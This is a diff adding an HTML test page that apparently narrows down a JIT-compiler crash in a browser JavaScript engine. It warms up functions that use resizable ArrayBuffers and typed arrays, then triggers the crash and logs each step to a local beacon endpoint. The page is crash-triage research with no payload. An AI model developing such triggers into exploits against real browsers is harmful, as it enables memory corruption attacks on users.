@@ -1,0 +1,117 @@
+<!--
+  p608d: Minimum DFG compilations to trigger crash
+
+  p608c proved: the 6th DFG-compiled function with resizable AB + fillers crashes,
+  regardless of TypedArray type (Uint16Array in p608b, Uint32Array in p608c).
+
+  Questions:
+  1. Do the prior 5 functions need to use resizable AB? Or do plain functions count?
+  2. What's the minimum number of prior DFG compilations needed?
+  3. Does the crashing function need resizable AB + fillers specifically?
+
+  CRASH_CLASS: MODERATE
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p608d</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+b('P608D-MIN-COMPILATIONS');
+
+// ================================================================
+// SECTION A: 5 PLAIN functions (no resizable, no typed array) then 1 resizable+fill
+// Tests: does the crash need the prior functions to use resizable AB?
+// ================================================================
+b('SEC-A:5-PLAIN-THEN-RESIZABLE');
+
+function plainA1(x){var o={a:x};o.b=x+1;o.c=x+2;o.d=x+3;o.e=x+4;return o.a+o.b+o.c+o.d+o.e;}
+function plainA2(x){var o={a:x};o.b=x*2;o.c=x*3;o.d=x*4;o.e=x*5;return o.a+o.b+o.c+o.d+o.e;}
+function plainA3(x){var a=[];for(var i=0;i<5;i++)a.push(x+i);return a[0]+a[1]+a[2]+a[3]+a[4];}
+function plainA4(x){var s=0;for(var i=0;i<10;i++)s+=x+i;return s;}
+function plainA5(x){return x*x+x*2+x*3+x*4+x*5;}
+
+for(var i=0;i<0x1000;i++){plainA1(i);plainA2(i);plainA3(i);plainA4(i);plainA5(i);}
+b('A-5PLAIN-WARMED');
+
+function trigA6(storeVal, fillObjs) {
+    var ab = new ArrayBuffer(0x100, {"maxByteLength": 0x1000});
+    var ta = new Uint32Array(ab);
+    var val = 0;
+    var t0=fillObjs[0];var t1=fillObjs[1];var t2=fillObjs[2];
+    var t3=fillObjs[3];var t4=fillObjs[4];
+    ta[3] = storeVal;
+    t0.y={};t1.y={};t2.y={};t3.y={};t4.y={};
+    return val;
+}
+var flA=[];for(var i=0;i<8;i++)flA.push({x:1});
+
+b('A-6TH-WARMUP-START');
+for(var i=0;i<0x1000;i++) trigA6(42, flA);
+b('A-6TH-WARMUP-DONE');
+
+try{trigA6(0xffffffff,flA);b('A-6TH-SURVIVED');}catch(e){b('A-6TH-EXCEPTION:'+e.message);}
+
+// ================================================================
+// SECTION B: 5 resizable+fill functions (same as p608c) then 1 PLAIN function
+// Tests: does the 6th function need to be resizable+fill to crash?
+// ================================================================
+b('SEC-B:5-RESIZABLE-THEN-PLAIN');
+
+function trigB1(sv,fo){var ab=new ArrayBuffer(0x100,{"maxByteLength":0x1000});var ta=new Uint32Array(ab);var v=0;var t0=fo[0];var t1=fo[1];var t2=fo[2];var t3=fo[3];var t4=fo[4];ta[3]=sv;t0.y={};t1.y={};t2.y={};t3.y={};t4.y={};return v;}
+function trigB2(sv,fo){var ab=new ArrayBuffer(0x100,{"maxByteLength":0x1000});var ta=new Int32Array(ab);var v=0;var t0=fo[0];var t1=fo[1];var t2=fo[2];var t3=fo[3];var t4=fo[4];ta[3]=sv;t0.y={};t1.y={};t2.y={};t3.y={};t4.y={};return v;}
+function trigB3(sv,fo){var ab=new ArrayBuffer(0x100,{"maxByteLength":0x1000});var ta=new Int16Array(ab);var v=0;var t0=fo[0];var t1=fo[1];var t2=fo[2];var t3=fo[3];var t4=fo[4];ta[3]=sv;t0.y={};t1.y={};t2.y={};t3.y={};t4.y={};return v;}
+function trigB4(sv,fo){var ab=new ArrayBuffer(0x100,{"maxByteLength":0x1000});var ta=new Int8Array(ab);var v=0;var t0=fo[0];var t1=fo[1];var t2=fo[2];var t3=fo[3];var t4=fo[4];ta[3]=sv;t0.y={};t1.y={};t2.y={};t3.y={};t4.y={};return v;}
+function trigB5(sv,fo){var ab=new ArrayBuffer(0x100,{"maxByteLength":0x1000});var ta=new Uint8Array(ab);var v=0;var t0=fo[0];var t1=fo[1];var t2=fo[2];var t3=fo[3];var t4=fo[4];ta[3]=sv;t0.y={};t1.y={};t2.y={};t3.y={};t4.y={};return v;}
+
+var flB=[];for(var i=0;i<8;i++)flB.push({x:1});
+for(var i=0;i<0x1000;i++){trigB1(42,flB);trigB2(42,flB);trigB3(42,flB);trigB4(42,flB);trigB5(42,flB);}
+b('B-5RESIZABLE-WARMED');
+
+function plainB6(x){var o={a:x};o.b=x+1;o.c=x+2;o.d=x+3;o.e=x+4;return o.a+o.b+o.c+o.d+o.e;}
+b('B-6TH-PLAIN-WARMUP-START');
+for(var i=0;i<0x1000;i++) plainB6(i);
+b('B-6TH-PLAIN-WARMUP-DONE');
+
+// ================================================================
+// SECTION C: Only 3 resizable+fill functions, then 4th is resizable+fill
+// Tests: is 3 enough, or do we need exactly 5?
+// ================================================================
+b('SEC-C:3-THEN-4TH');
+
+function trigC1(sv,fo){var ab=new ArrayBuffer(0x100,{"maxByteLength":0x1000});var ta=new Uint32Array(ab);var v=0;var t0=fo[0];var t1=fo[1];var t2=fo[2];var t3=fo[3];var t4=fo[4];ta[3]=sv;t0.y={};t1.y={};t2.y={};t3.y={};t4.y={};return v;}
+function trigC2(sv,fo){var ab=new ArrayBuffer(0x100,{"maxByteLength":0x1000});var ta=new Int32Array(ab);var v=0;var t0=fo[0];var t1=fo[1];var t2=fo[2];var t3=fo[3];var t4=fo[4];ta[3]=sv;t0.y={};t1.y={};t2.y={};t3.y={};t4.y={};return v;}
+function trigC3(sv,fo){var ab=new ArrayBuffer(0x100,{"maxByteLength":0x1000});var ta=new Int16Array(ab);var v=0;var t0=fo[0];var t1=fo[1];var t2=fo[2];var t3=fo[3];var t4=fo[4];ta[3]=sv;t0.y={};t1.y={};t2.y={};t3.y={};t4.y={};return v;}
+
+var flC=[];for(var i=0;i<8;i++)flC.push({x:1});
+for(var i=0;i<0x1000;i++){trigC1(42,flC);trigC2(42,flC);trigC3(42,flC);}
+b('C-3-WARMED');
+
+function trigC4(sv,fo){var ab=new ArrayBuffer(0x100,{"maxByteLength":0x1000});var ta=new Uint8Array(ab);var v=0;var t0=fo[0];var t1=fo[1];var t2=fo[2];var t3=fo[3];var t4=fo[4];ta[3]=sv;t0.y={};t1.y={};t2.y={};t3.y={};t4.y={};return v;}
+
+b('C-4TH-WARMUP-START');
+for(var i=0;i<0x1000;i++) trigC4(42,flC);
+b('C-4TH-WARMUP-DONE');
+
+try{trigC4(0xffffffff,flC);b('C-4TH-SURVIVED');}catch(e){b('C-4TH-EXCEPTION:'+e.message);}
+
+// ================================================================
+// SECTION D: Only 1 resizable+fill function (no prior compilations beyond Section A-C)
+// Tests: does it crash with just 1 function? (This is 10th+ overall DFG function)
+// ================================================================
+b('SEC-D:SINGLE-RESIZABLE');
+
+function trigD1(sv,fo){var ab=new ArrayBuffer(0x100,{"maxByteLength":0x1000});var ta=new Uint32Array(ab);var v=0;var t0=fo[0];var t1=fo[1];var t2=fo[2];var t3=fo[3];var t4=fo[4];ta[3]=sv;t0.y={};t1.y={};t2.y={};t3.y={};t4.y={};return v;}
+
+var flD=[];for(var i=0;i<8;i++)flD.push({x:1});
+b('D-WARMUP-START');
+for(var i=0;i<0x1000;i++) trigD1(42,flD);
+b('D-WARMUP-DONE');
+
+try{trigD1(0xffffffff,flD);b('D-SURVIVED');}catch(e){b('D-EXCEPTION:'+e.message);}
+
+// ================================================================
+b('P608D-COMPLETE');
+}
+
+setTimeout(main, 200);
+</script></head><body>p608d: minimum DFG compilations to trigger crash</body></html>
